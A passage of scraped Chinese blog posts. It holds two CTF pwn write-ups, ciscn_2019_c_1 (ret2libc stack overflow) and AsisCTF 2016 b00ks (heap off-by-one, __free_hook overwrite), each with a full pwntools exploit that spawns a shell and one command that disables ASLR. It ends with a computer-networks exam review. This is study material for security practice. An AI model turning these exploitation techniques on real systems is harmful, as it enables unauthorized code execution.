enabledPIE: No PIE (0x400000)程序流程比较简单，在encrypt函数里由于使用的是gets(s),存在栈溢出。但是程序会对我们输入的字符串s进行一系列异或操作。这里需要注意这个(unsigned int)x。再看到下面的++x;，然后也可以推测出x的初始值为0。这也就是说，只有当我们输入的字符串的长度大于x的值的时候，才会执行这一系列异或操作。所以如果我们输入两次长度相等的字符串，那么只会对第一次输入的字符串进行异或。由于程序没有后门函数，我们需要自己泄露libc了。0x02泄露libc我们可以通过用puts函数打印出puts_got的内容，从而通过LibcSearcher得到libc，进而得到libcbase、system、/bin/sh。由于异或运算是可逆的，我们首先写出来一个encrypt函数(实际上叫decrypt更合适)，但是似乎不对payload进行encrypt也可以….12345678910def encrypt(payload): l = list(payload) for i in range(len(l)): if l[i].isdigit(): l[i] = chr(ord(l[i])^0xF) elif l[i].isupper(): l[i] = chr(ord(l[i])^0xE) elif l[i].islower(): l[i] = chr(ord(l[i])^0xD) return ''.join(l)简单构造一下payload用以输出puts_got的内容。12345678elf = ELF('./ciscn_2019_c_1')main_addr = 0x400B28pop_rdi = 0x400C83puts_got = elf.got['puts']puts_plt = elf.plt['puts']payload = '1'*0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)获取libcbase、system、binsh。123456789c.recvuntil('Ciphertext\\n')c.recvuntil('\\n')puts_addr = u64(c.recvuntil('\\n', drop=True).ljust(8,'\\x00'))log.success('puts_addr = ' + hex(puts_addr))libc = LibcSearcher('puts',puts_addr)libcbase = puts_addr - libc.dump('puts')log.success('libcbase = ' + hex(libcbase))sys_addr = libcbase + libc.dump('system')bin_sh = libcbase + libc.dump('str_bin_sh')0x03 getshell这里需要注意一点由于Ubuntu18运行机制与前面版本的不同，在调用system的时候需要进行栈对齐我们可以使用ret进行栈对齐。123456ret = 0x4006b9payload = '1'*0x58+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)payload_Ubuntu18 = '1'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)c.sendline(payload_Ubuntu18)c.interactive()0x04 完整exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *from LibcSearcher import *#c = process('./ciscn_2019_c_1')c = remote('node3.buuoj.cn',28201)elf = ELF('./ciscn_2019_c_1')main_addr = 0x400B28pop_rdi = 0x400C83puts_got = elf.got['puts']puts_plt = elf.plt['puts']def encrypt(payload): l = list(payload) for i in range(len(l)): if l[i].isdigit(): l[i] = chr(ord(l[i])^0xF) elif l[i].isupper(): l[i] = chr(ord(l[i])^0xE) elif l[i].islower(): l[i] = chr(ord(l[i])^0xD) return ''.join(l)c.recv()c.sendline('1')c.recvuntil('encrypted\\n')payload = '1'*0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)payload = encrypt(payload)c.sendline(payload)c.recvuntil('Ciphertext\\n')c.recvuntil('\\n')puts_addr = u64(c.recvuntil('\\n', drop=True).ljust(8,'\\x00'))log.success('puts_addr = ' + hex(puts_addr))libc = LibcSearcher('puts',puts_addr)libcbase = puts_addr - libc.dump('puts')log.success('libcbase = ' + hex(libcbase))c.recv()c.sendline('1')c.recvuntil('encrypted\\n')sys_addr = libcbase + libc.dump('system')bin_sh = libcbase + libc.dump('str_bin_sh')payload = '1'*0x58+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)ret = 0x4006b9payload_Ubuntu18 = '1'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)c.sendline(payload_Ubuntu18)c.interactive()0x05 参考链接传送门传送门","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"堆off by one(AsisCTF 2016 b00ks)","slug":"堆off-by-one-AsisCTF-2016-b00ks","date":"2020-01-17T15:11:46.000Z","updated":"2020-01-17T18:41:00.545Z","comments":true,"path":"2020/01/17/堆off-by-one-AsisCTF-2016-b00ks/","link":"","permalink":"http://liul14n.top/2020/01/17/堆off-by-one-AsisCTF-2016-b00ks/","excerpt":"","text":"Some things will never start if you don’t begin to do them.0x00 前言这是CTF-WIKI上用来讲解off-by-one的一道例题,但是显然上面的讲解对新手并不友好,在查阅各种资料、看了各位大佬们的博客后，终于把这道题目搞懂了。因为这道题目面向新手的WP并不多，所以特地写下这篇博客，尽可能全面的讲解一下这道题目。0x01 题目下载链接下载链接0x02 off-by-one 知识储备相关知识在CTF-WIKI上也有较为详细的讲解，此处略过。为了更好的理解本文，建议先看看CTF-WIKI上的相关讲解，同时也要好好理解指针的相关概念。0x03 分析程序与调试12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: PIE enabled一些函数我都进行了重命名，这里这些函数比如create、delete都可以先点进去看看,要了解这些函数能实现什么功能，从而为后续利用做准备。同时为了方便调试，临时禁用了系统的地址随机化功能：echo 0 &gt; /proc/sys/kernel/randomize_va_space寻找漏洞进入change_author_name函数，然后观察my_read函数，发现在存在off-by-one漏洞，由于程序没有对边界进行正确限定而产生了此处漏洞，该漏洞会越界并将低字节覆盖为\\x00。很遗憾的是，只有change_author_name函数存在这个漏洞，其他函数例如create函数都额外做了边界限制处理。1234567891011121314151617181920212223242526272829303132signed __int64 change_author_name()&#123; printf(\"Enter author name: \"); if ( !(unsigned int)my_read(off_202018, 32) ) return 0LL; printf(\"fail to read author_name\", 32LL); return 1LL;&#125;signed __int64 __fastcall my_read(_BYTE *a1, int a2)&#123; int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( a2 &lt;= 0 ) return 0LL; buf = a1; for ( i = 0; ; ++i ) &#123; if ( (unsigned int)read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == 10 ) break; ++buf; if ( i == a2 ) break; &#125; *buf = 0; // 漏洞所在位置。 return 0LL;&#125;注意到这个off_202018,很容易想到这是与author_name有关的。双击进去,它指向了unk_202040,由于我们的程序开启了PIE保护,所以真正存储author_name的位置应该是程序真正的加载基址 + 0x202040,这个程序真正的加载基址可以通过gdb调试得出。继续看create函数，由于这个函数代码量有点大，不再把全部代码放出来。在该函数中,我们能根据下面这一块能得到book的结构体。其中*((_DWORD *)book_struct + 6) = v1;可以转化为*((_QWORD *)book_struct + 3) = v1;所以我们得到book结构体123456stuct book&#123; int id; char *name; char *description; int size;&#125;注意到此处的off_202010,从上面红框中的代码也能看出来,v2是当前创建的book的索引,那么off_202010所对应的应该就是存放book结构体的结构体数组。双击过去，它指向了unk_202060，在前面我们得知unk_202040存放的是author_name。也就是说，author_name首地址与book结构体数组首地址相差0x20字节。而很巧，程序恰好限定了author_name的最大长度就是0x20，而且！！ 我们的change_author_name函数存在off-by-one漏洞，这也就意味着,我们能够通过这个漏洞对book结构体数组的首地址(也就是第一个book结构体的地址)进行一些操作或利用。泄露第一个book结构体的地址能进行什么样的操作或者利用呢？ 接着看case4: print()函数这个函数能够打印出author_name，nice！。我们设想一个程序执行流程，首先，我们应程序要求，输入了author_name，我们故意输入也就是32个A。在内存中应该是这样。注意蓝色部分，那里实际上就是off-by-one漏洞越界覆盖的低字节，覆盖成了\\x00,实际上那里本来就是\\x00…覆盖了以后还是\\x00。关于前面的地址，这是程序在我机器上面运行的程序加载地址0x555555554000+0x202040(前面提到过)得到的，不同机器有可能不一样。这个程序加载地址可以在gdb中使用pie或vmmap命令查得。继续， 下面的0x555555756060就是book结构体数组的首地址，存放第一个book结构体（后面记作book1）的地址，当我们create book1时，book1的地址会覆盖掉这一块。而在C语言中，字符串是靠\\x00来进行截断的，覆盖掉了author_name的\\x00，那么我们就可以通过print()函数打印出author_name连带着把book1的地址打印出来了。一些小补充注意create函数里面，对于每个book结构体，它的chunk大小应该是0x20(用户申请) + 0x10(chunk头) = 0x30，但是由于前面还malloc了book_name与book_description，book1的地址和book2的地址相差可能并不是0x30，除非当book_name和book_description申请的内存足够大时它俩才相差0x30，不然就要另外计算咯，这好像和malloc的分配算法有关。 具体book1的地址和book2的地址差多少可以通过在本地动态调试算出来。这里也推荐通过动态调试来计算差值。继续如果知道了book1的地址和book2的地址之间的差值(这个差值无论是在本地打还是远程打应该都是不变的)，我们就可以通过刚刚通过打印得到的book1的地址来推算出book2的地址。继续模拟一下流程，当我们创建了book1以后，内存应该是这个样子(具体值可能有所不同)。123456780x555555756040: 0x6161616161616161 0x61616161616161610x555555756050: 0x6161616161616161 0x61616161616161610x555555756060: 0x0000555555758160 0x0000000000000000......0x555555758150: 0x0000000000000000(prev_size) 0x0000000000000031(size)0x555555758160: 0x0000000000000001(ID) 0x0000555555758020(book_name_ptr)0x555555758170: 0x00005555557580c0(book_des_ptr) 0x000000000000008c(des_size)非常巧的是，book1的book_des_ptr为0x00005555557580c0，如果我们申请book_description的大小足够大的话，它是有可能包含0x0000555555758100的。为什么要包含这个地址？ 因为我们的程序是拥有case5 ：change_author_name的，可以多次使用off-by-one漏洞，当我们再次使用这个漏洞时，就会将0x0000555555758160的低字节覆盖为\\x00，从而变成0x0000555555758100。伪造book struct在此之前，我们先创建一个book2,让它的book_name的size和book_description的size尽可能大！这里尽量大也是为了后面泄露libc作铺垫。这里都取0x21000（为啥取这个？懒了，wp上就是这个懒得换了。。），因为这俩size足够大，所以book2地址 = book1地址 + 0x30 。（这在前面小补充里面有讲，当然也可以动态调试出来）优秀的大佬们由此想出来一个方法，就像套娃一样，在book_description中伪造一个book结构体(记作book_struct)。由于0x0000555555758100 - 0x00005555557580c0 = 0x40,所以可以这么构造。12345payload = 'a'*0x40 #Paddingpayload += p64(1) #IDpayload += p64(book2_struct_addr + 8) #book_name_ptrpayload += p64(book2_struct_addr + 8) #book_des_ptrpayload += p64(0xffff) #description_size填充0x40个a是为了让0x0000555555758100正好指向我们伪造的book_struct。book2_struct_addr是前面推算出来的book2的地址，+8以后就指向(注意这是指向！)了book2_name_ptr，至于为什么要让它指向book2_name_ptr，别着急，慢慢看下去。程序是拥有edit函数的，可以修改book_description的，我们将其修改为我们的payload即可完成伪造book_struct。我们伪造好以后， change_author_name,依然输入32个a，然后book结构体数组的首地址就变成了0x0000555555758100，也就指向了我们伪造的book_struct。这个book_struct是存在于book1的description中，而已经没有指针指向book1了，下面全靠这个伪造的book来发挥作用了。泄露libc基地址当分配的堆块的大小在某一个范围内的话，系统会通过brk方法来分配（brk 会直接拓展原来的堆），但是当分配超级大的堆块时，程序会用mmap方法来分配堆（mmap 会单独映射一块内存），mmap分配的堆块和libc之间存在着固定的偏移，因此我们可以推算出来libc的基地址（偏移需要用gdb中的vmmap来计算）说白了就是可以在本地想办法算出来mmap和libc之间的偏移，这个偏移无论是打本地还是打远程都是固定的。所以book2的name的size取得特别大，目的就是为了用来泄露libc。我们可以通过程序的case4 ：print()来打印出来book2_name_ptr。理解这里需要熟练理解与运用指针，因为我们伪造的book_struct的book_name_ptr与book_des_ptr都指向book2_name_ptr，而我们打印出来的都是%s， 也就是字符串，也就是内容，也就相当于我们把book2_name_ptr打印了出来。emmmmm 取 Name 或者 Description其中一个的打印结果然后处理一下就行。。然后我们在gdb中用vmmap命令可以得到本地调试时libc的基址偏移就是本地调出来的book2_name_ptr - libc基址。那么打远程的时候，libc基址就是book2_name_ptr - 偏移。getshell由于这道题Full RELRO，我们无法通过覆盖got表来getshell。优秀的大佬们想出了用__free_hook来劫持free函数。关于__free_hook:12void weak_variable (*__free_hook) (void *__ptr, const void *) = NULL;可以看出__free_hook是一个常量。 简单地说，当__free_hook的值不为NULL时，在调用free函数时，会首先执行__free_hook所指向的指令。这里也提到了free函数，与其相关的肯定是程序中的delete函数这个函数会先free掉book_name,然后free掉book_des,最后是id，结合这个顺序，优秀的大佬们想出了构造方法。1234567891011121314free_hook = libc.symbols['__free_hook'] + libcbasesystem = libc.symbols['system'] + libcbasebinsh_addr = libc.search('/bin/sh').next() + libcbasepayload1 = p64(binsh_addr) + p64(free_hook)edit_book(target, 1, payload1)payload2 = p64(system)edit_book(target, 2, payload2)delete_book(target, 2)target.interactive()我们在执行完edit_book(target, 1, payload1)以后，由于edit函数修改的是description的内容，而我们此时修改的是伪造的book_struct,它的description的内容是book2_struct_addr + 8这是个指针，修改完后变成了指向/bin/sh的指针了。 由于p64占8字节，所以p64(free_hook)会覆盖到book2_struct_addr + 16 即 book2的description位置。看着估计有点晕？仔细想想就是下面这种结构。123456789101112伪造book:0x0000000000000001 , book2_struct_addr+8(指针)book2_struct_addr+8(指针), des_size原来的book2:0x0000000000000002 ,book2_name_ptrbook2_des_ptr ,des_size第一次edit操作以后的book2:0x0000000000000002 ,bin_sh_ptrfree_hook_ptr ,des_size在执行完edit_book(target, 2, payload2)以后，修改的实际上是book2_struct_addr + 16地址所指向的内容，也就是free_hook_ptr所指向的内容，即free_hook的内容，也就是说，执行完后，我们的__free_hook里面存着system指令。那么按照前文所讲，我们在调用free之前，将会先调用system函数，那么如何给system传参？由于我们的delete函数会先free掉book_name_ptr，但是book2_name_ptr已经被我们修改成bin_sh_ptr，而且调用free之前会先调用system函数，由于void free(void *ptr)，int system(const char* command)，这两个函数的参数都是个指针。那么 free(book2_name_ptr)就被我们成功变成了system(bin_sh_ptr)了！ Nice~0x04 exploit我是exp的搬运工:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798# -*- coding: UTF-8 -*-from pwn import *#context(log_level='debug', os='linux')def create_book(target, name_size, book_name, desc_size, book_desc): target.recv() target.sendline('1') target.sendlineafter('Enter book name size: ', str(name_size)) target.sendlineafter('Enter book name (Max 32 chars): ', book_name) target.sendlineafter('Enter book description size: ', str(desc_size)) target.sendlineafter('Enter book description: ', book_desc)def delete_book(target, book_id): target.recv() target.sendline('2') target.sendlineafter('Enter the book id you want to delete: ', str(book_id))def edit_book(target, book_id, book_desc): target.recv() target.sendline('3') target.sendlineafter('Enter the book id you want to edit: ', str(book_id)) target.sendlineafter('Enter new book description: ', book_desc)def print_book(target): target.recvuntil('&gt;') target.sendline('4')def change_author_name(target, name): target.recv() target.sendline('5') target.sendlineafter('Enter author name: ', name)def input_author_name(target, name): target.sendlineafter('Enter author name: ', name)DEBUG = 0LOCAL = 1if LOCAL: target = process('./b00ks')else: target = remote('127.0.0.1', 5678)libc = ELF('./libc.so.6') # 这个也可以是libc-2.23.so，都能打通。。# used for debugimage_base = 0x555555554000 if DEBUG: pwnlib.gdb.attach(target, 'b *%d\\nc\\n' % (image_base+0xd20))input_author_name(target, 'a'*32)create_book(target, 140 ,'book_1', 140, 'first book created')# leak boo1_struct addrprint_book(target)target.recvuntil('a'*32)temp = target.recvuntil('\\x0a')book1_struct_addr = u64(temp[:-1].ljust(8, '\\x00'))book2_struct_addr = book1_struct_addr + 0x30create_book(target, 0x21000, 'book_2', 0x21000, 'second book create')# fake book1_structpayload = 'a' * 0x40 + p64(1) + p64(book2_struct_addr + 8) * 2 + p64(0xffff)edit_book(target, 1, payload)change_author_name(target, 'a'*32)# leak book2_name ptrprint_book(target)target.recvuntil('Name: ')temp = target.recvuntil('\\x0a')book2_name_ptr = u64(temp[:-1].ljust(8, '\\x00'))log.success('book2_name_ptr = ' + hex(book2_name_ptr))# find in debug: mmap_addr - libcbaseoffset = 0x7ffff7fba010 - 0x7ffff7a0d000 #这里的0x7ffff7fba010不同机器可能不一样，要动态调试一下。libcbase = book2_name_ptr - offsetfree_hook = libc.symbols['__free_hook'] + libcbasesystem = libc.symbols['system'] + libcbasebinsh_addr = libc.search('/bin/sh').next() + libcbasepayload = p64(binsh_addr) + p64(free_hook)edit_book(target, 1, payload)payload = p64(system)edit_book(target, 2, payload)delete_book(target, 2)target.interactive()0x05 参考链接感谢各位大佬的WP！这篇博客评论区有黄金看雪的一篇新手向的WPCSDN上一篇对萌新较为友好的WPCTF-WIKI","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"计算机网络复习","slug":"计算机网络复习","date":"2019-12-18T07:41:12.000Z","updated":"2020-07-11T15:57:19.078Z","comments":true,"path":"2019/12/18/计算机网络复习/","link":"","permalink":"http://liul14n.top/2019/12/18/计算机网络复习/","excerpt":"","text":"前言这篇复习博客是基于老师的PPT和课本来写的，根据老师给的重点内容来写的。博客可以在手机上打开, 就不用再拿着课本来看了。第一章 概述Q1 计算机网络的概念和功能计算机网络的概念：计算机网络是指将地理位置不同的多台计算机及其外部设备，通过通信线路连接起来实现资源共享和信息传递的计算机系统。ps:目前最大的网络–因特网使用TCP/IP协议。计算机网络的功能连通：计算机与计算机之间不论相距多远,都能便捷地交换各种信息。共享：所谓共享就是资源共享，可以是信息共享，软件共享，也可以是硬件共享。ps:计算机网络的基本特点:连通性和共享。Q2 本章缩写ISP(Internet Service Provider)，互联网服务提供商。TCP/IP（Transmission Control Protocol/Internet Protocol，传输控制协议/网际协议）。Request For Comments（RFC），是一系列以编号排定的文件。文件收集了有关互联网相关信息，以及UNIX和互联网社区的软件文件。 ps:课本上译为“请求评论”。C/S服务(客户机-服务器服务)，即Client-Server(C/S)结构。P2P(peer to peer)，对等连接方式。Q3 三种交换方式的比较电路交换电路交换：在使用电路交换进行通话之前，必须先拨号建立一条连接，通信线路为通信双方用户专用，数据直达。ps: 电路交换面向连接。优点:实现简单，不存在数据失序问题，实时性强，传输时延非常小，电路交换既适用于传输模拟信号，也适用于传输数字信号。缺点:平均连接建立时间长，信道利用率低，在通信过程中难以实现差错控制。报文交换报文交换：报文交换是以报文为数据交换的单位，报文携带有目标地址、源地址等信息，在交换结点采用存储转发的传输方式。优点：不存在连接建立时延，用户可随时发送报文，提供多目标服务，即一个报文可以同时发送到多个目的地，通信线路的利用率高，允许建立数据传输的优先级。缺点：报文交换的实时性差，报文交换只适用于数字信号，增加了传送时延。分组交换分组交换：分组交换仍采用存储转发传输方式，但将一个长报文先分割为若干个较短的分组，然后把这些分组（携带源、目的地址和编号信息）逐个地发送出去。优点：分组交换比报文交换的时延小，用户可随时发送分组，提高了通信线路的利用率，发送数据更加灵活，时延更小，网络生存性好。缺点：分组都要加上源、目的地址和分组编号等信息，增加了处理的时间，使控制复杂，时延增加可能出现失序，丢失或重复分组，发送设备和接收设备更加复杂。Q4 因特网的工作原理分组交换、存储转发Q5 网络的分类和网络的评价指标网络的分类按照网络的作用范围进行分类可以分为广域网WAN、城域网MAN、局域网LAN、个人区域网PAN。按照网络的使用者进行分类可以分为公用网、专用网。网络的评价指标速率: 数据的传送速率，也称为数据率。带宽: 计算机网络中的带宽指的是在单位时间内网络中的某信道所能通过的最高数据率，单位是bit/s。吞吐量: 表示单位时间内通过某个网络的实际的数据量。时延: 时延分为: 发送时延、传播时延、处理时延、排队时延。ps: 降低处理时延比较好。Q6服务与协议服务是垂直的,服务是由下层向上层通过层间接口提供的。协议是水平的，即协议是控制对等实体之间通信的规则的集合。在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务。要实现本层协议，还需要使用下层所提供的服务。本层的服务用户只能看见服务而无法看见下面的协议。下面的协议对上面的服务用户是透明的。Q7 理解31页计算机网络体系结构在五层协议的结构体系中:物理层解决01的传输问题。数据链路层解决数据帧的传输问题。网络层解决数据包从起点到终点的传输问题。运输层解决端与端之间的通讯问题。第二章 物理层Q1 物理层的功能物理层负责数据的比特流如何在传输媒体上的传输,即物理层负责解决0和1的传输问题。Q2 理解一些概念模拟信号和数字信号模拟信号(又称连续信号): 代表消息的参数的取值是连续的。数字信号(又称离散信号): 代表消息的参数的取值是离散的。有关信道的几个概念单向通信（单工通信）—— 只能有一个方向的通信而没有反方向的交互。ps:例如打印机,只能计算机向打印机传输数据。双向交替通信（半双工通信）—— 通信的双方都可以发送信息，但不能双方同时发送(当然也就不能同时接收)。ps:例如对讲机。双向同时通信（全双工通信）—— 通信的双方可以同时发送和接收信息。 ps:例如电话。基带信号与带通信号基带信号：来自信源的信号。像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。基带信号往往包含有较多的低频成分，甚至有直流成分，而许多信道并不能传输这种低频分量或直流分量。因此必须对基带信号进行调制(modulation)。带通信号：把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道中传输（即仅在一段频率范围内能够通过信道）。Q3 信号调制的方法最基本的二元制调制方法有以下几种：调幅(AM)：载波的振幅随基带数字信号而变化。调频(FM)：载波的频率随基带数字信号而变化。调相(PM) ：载波的初始相位随基带数字信号而变化。Q4 香农公式和奈氏准则奈氏准则告诉我们:在任何信道中,码元传输的速率是有上限的,传输速率超过此上限,就会出现严重的码间串扰问题,使接收端对码元的判决(即识别)成为不可能。香农公式: C=W*log₂（1+S/N) （bit/s)其中C为信道的极限信息传输速率，W 为信道的带宽（以 Hz 为单位），S 为信道内所传信号的平均功率，N 为信道内部的高斯噪声功率。Q5 传输媒介有线(导引型传输媒介)双绞线: 造价低，稳定性强，施工方便同轴电缆: 抗干扰能力好，传输数据稳定，价格也便宜光缆: 频带较宽，不受电磁干扰，衰减较小、无线(非导引型传输媒介)无线传输所使用的频段很广。短波通信主要是靠电离层的反射，但短波信道的通信质量较差。微波在空间主要是直线传播。Q6 信道复用技术频分复用 FDM用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。频分复用的所有用户在同样的时间占用不同的带宽资源（请注意，这里的“带宽”是频率带宽而不是数据的发送速率）。时分复用 TDM时分复用则是将时间划分为一段段等长的时分复用帧（TDM 帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。每一个用户所占用的时隙是周期性地出现（其周期就是 TDM 帧的长度）。TDM 信号也称为等时(isochronous)信号。时分复用的所有用户是在不同的时间占用同样的频带宽度。时分复用可能会造成线路资源的浪费概念看着很难理解, 可以看看别的文章。传送门统计时分复用 STDM时分复用的改进版。波分复用 WDM光的频分复用。码分复用 CDM各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。每一个比特时间划分为 m 个短的间隔，称为码片(chip)码分复用利用了码分多址 CDMA (Code Division Multiple Access)每个站分配的码片序列不仅必须各不相同，并且还必须互相正交(orthogonal)。关于内积:假设S 为 (-1，-1，1，-1), T 为(-1，1，-1，-1),则内积为:-1*-1 + -1*1 + 1*-1 + -1*-1。即对应位置相乘然后相加。Q7 本章缩写STP（Spanning Tree Protocol）是生成树协议的英文缩写，可应用于计算机网络中树形拓扑结构建立，主要作用是防止网桥网络中的冗余链路形成环路工作。STP 同时也是屏蔽双绞线Shielded Twisted Pair的缩写。UTP ：非屏蔽双绞线(Unshielded Twisted Pair)CDMA : (Code Division Multiple Access) 码分多址。ADSL : (Asymmetric Digital Subscriber Line） 非对称数字用户线路。第三章 数据链路层Q1 数据链路层的功能和协议数据链路层的功能主要是解决临结点间数据帧的传输问题,可以概括为三个环节：即封装成帧、透明传输、差错检测。协议:主要协议有PPP协议(点对点协议)和CSMA/CD协议(载波侦听/冲突检测)。Q2 PPP协议的工作原理ps:这个内容老师PPT上也没有, 课本上也没有, PPT和课本上共有的是PPP协议的特点、组成、帧格式、工作状态。下面是我百度的一些PPP工作原理的答案:PPP协议的运行分为四个阶段：第一阶段：建立链路（LCP）第二阶段：验证（PAP/CHAP）第三阶段：网络控制协商（NCP）第四阶段：终止PPP链路（LCP）为了更好地应对有关PPP协议的题目,这里也把PPP的特点、组成、帧格式这些我个人认为比其工作原理更有可能考的问题记一下:特点(1) 简单：在同一条物理链路上进行点对点的数据传输，对数据链路层的帧不进行纠错，不需要序号，不需要流量控制。(2) 封装成帧：加入帧界定符。(3) 透明性：采用字节填充法。(4) 支持多种网络层协议：在同一条物理链路上同时支持多种网络层协议（如IP和IPX等）的运行。(5) 支持多种链路类型：PPP必须能够在多种类型的链路上运行，例如串行或并行链路。(6) 差错检测：接收方收到一个帧后进行CRC检验，若正确就收下这个帧，反之则丢弃。(7) 检测连接状态：自动检测链路是否处于正常工作状态。组成PPP 协议有三个组成部分：一个将 IP 数据报封装到串行链路的方法。链路控制协议 LCP (Link Control Protocol)。网络控制协议 NCP (Network Control Protocol)。帧格式对于首部的FAC,其中标志字段F = 0x7E,地址字段A只置为0xFF，实际上不起作用,控制字段C通常置为0x03。尾部的FCS是帧校验序列,是用于CRC校验的标志位。所有的 PPP 帧的长度都是整数字节,即不存在如1505.5字节大小的PPP帧。Q3 数据链路层传输数据的基本单位和完成工作的基本原则基本单位: 帧ps:各自传输数据的基本单位: 网络层: 包、数据链路层: 帧、物理层: 比特。完成工作的基本原则:封装成帧首先是封装成帧，封装成帧(framing)就是在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。确定帧的界限。首部和尾部的一个重要作用就是进行帧定界。透明传输我们在完成了封装成帧又出现了新的问题, 我们该如何处理如下图的情况？这可以去类比C语言的类似情况,这让我们想到了C语言的转义符号\\,同样,我们也可以在数据帧这块引入我们的转义符号,这种方法叫做字节填充法或字符填充法。这样我们得到的帧就是这种形式了:那么接收端该如何处理这多出来的转义符号呢？接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。而且如果转义字符也出现数据当中，那么应在转义字符前面插入一个转义字符。当接收端收到连续的两个转义字符时，就删除其中前面的一个。差错检测(校验)在传输过程中可能会产生比特差错：1 可能会变成 0 而 0 也可能变成 1。在一段时间内，传输错误的比特占所传输比特总数的比率称为误码率 BER (Bit Error Rate)。在数据链路层传送的帧中，广泛使用了循环冗余检验 CRC的检错技术。下面的问题中会具体介绍这个检错方法。Q4 CRC校验计算方法及它与多项式的对应关系这个有点难写, 具体可以看下面一篇博客, 写的还算比较通俗易懂的, 但愿这个考点考不到。传送门ps:补充一点: 模2除法可以看作异或运算。Q5 以太网的工作原理和方法以太网采用CSMA/CD协议,能够实现载波侦听,冲突检测,多点随机接入,二进制退避。载波监听是指每一个站在发送数据之前先要检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不要发送数据，以免发生碰撞。冲突检测：多点随机接入表示许多计算机以多点接入的方式连接在一根总线上。二进制退避: 发生碰撞的站在停止发送数据后，要推迟（退避）一个随机时间才能再发送数据。Q6 网卡的功能数据的封装与解封。发送时将上一层交下来的数据加上首部和尾部，成为以太网的帧。接收时将以太网的帧剥去首部和尾部，然后送交上一层。链路管理。主要是CSMA/CD协议的实现。编码与译码。即曼彻斯特编码与译码。Q7 数据链路层信道的使用方法数据链路层有两种信道:第一种是点对点信道,实现协议是PPP协议第二种是广播信道,实现协议是CSMA/CD协议，ps:使用CDMA/CD协议的以太网只能进行半双工通信。Q8 本章缩写CRC: 循环冗余校验（Cyclic Redundancy Check， CRC）CSMA/CD：载波侦听多路访问/冲突检测(Carrier Sense Multiple Access with Collision Detection)PPP: 点对点协议（Point to Point Protocol，PPP）MAC地址: Media Access Control Address，媒体存取控制位址FCS: Frame Check Sequences，帧校验序列LLC: Logical Link Control，逻辑链路控制VLAN: Virtual Local Area Network，虚拟局域网Q9 各层如何拓展网络物理层采用集线器、Hub来拓展网络数据链路层采用网桥、交换机来拓展网络网络层采用路由器来拓展网络。其中交换机、网桥可以隔绝碰撞域。路由器可以隔绝广播域。Q10 网桥和交换机的工作原理 (重点！)网桥网桥根据 MAC 帧的目的地址对收到的帧进行转发。网桥具有过滤帧的功能。当网桥收到一个帧时，并不是向所有的接口转发此帧，而是先检查此帧的目的 MAC 地址，然后再确定将该帧转发到哪一个接口。网桥的优点: 过滤通信量、扩大了物理范围、提高了可靠性、可互连不同物理层、不同 MAC 子层和不同速率（如10 Mb/s 和 100 Mb/s 以太网）的局域网。网桥的缺点:存储转发增加了时延、在MAC 子层并没有流量控制功能、网桥只适合于用户数不太多和通信量不太大的局域网。网桥的功能可以归结为学习、转发。交换机理解了网桥以后,交换机就简单了, 交换机就可以当做多接口的网桥。交换机通常都有十几个接口。因此，以太网交换机实质上就是一个多接口的网桥，可见交换机工作在数据链路层。Q11 VLAN的功能及实现方法VLAN的功能:限制广播域：广播域被限制在一个VLAN内，节省了带宽，提高了网络处理能力。增强局域网的安全性：不同VLAN内的报文在传输时是相互隔离的，即一个VLAN内的用户不能和其它VLAN内的用户直接通信。提高网络的健壮性：故障被限制在一个VLAN内，本VLAN内的故障不会影响其他VLAN的正常工作。灵活构建虚拟工作组：用VLAN可以划分不同的用户到不同的工作组，同一工作组的用户也不必局限于某一固定的物理范围，网络构建和维护更方便灵活。VLAN的实现方式有:基于端口划分、基于MAC地址划分、基于IP划分、基于策略划分。Q12 个人补充记住一个特殊的数字1518第四章 网络层Q1 网络层的功能和协议网络层的功能: 网络层主要解决数据包从起点到终点的传输问题。与网络层相关的协议: 地址解析协议 ARP、逆地址解析协议 RARP、内部网关协议 RIP、内部网关协议 OSPF、外部网管协议 BGP等…Q2 IP和MAC的关系？(为什么既要有MAC有需要有IP)首先来简单介绍一下MAC地址和IP地址。MAC地址是绝对的MAC地址又称为物理地址，每一台主机有一个固定的MAC地址，可以理解成这台主机出厂就具备了该物理地址，就好比人的身份证号，每个人都有自己唯一的身份证号。IP地址是相对的IP地址并不是主机唯一的，我们知道IP地址有共有IP地址和私有IP地址之分（如下图所示）。其中公有地址是由统一管理分配的，例如我们搭建了一个网站，希望能被所有地方的人访问到，则需要去购买一个公有的IP地址；私有IP地址则是在局域网内部，比如教研室、宿舍、办公室等大家的IP地址（可通过接入设备，以一个共同的公网IP而连接外网），例如常用的192.168.0.1、192.168.0.2等。所以问题的答案就是: IP地址决定了网络中数据包如何通过路由器的转发到达目的地，而MAC地址则唯一标识了接受这个数据包的主机。ps:可以把IP地址当做快递地址, MAC是收件人。Q3 网络层的服务(下面的对比表是重点)网络层向运输层提供的服务主要有两种: 第一种是面向连接，另一种是无连接。它们还有另外的叫法: 可靠服务和不可靠服务。这里以虚电路服务和数据报服务以及TCP/IP和UDP为例。虚电路服务和TCP/IP是可靠服务,是面向连接的。数据报服务和UDP是不可靠服务,是无连接的。Q4 本章缩写ARP:（Address 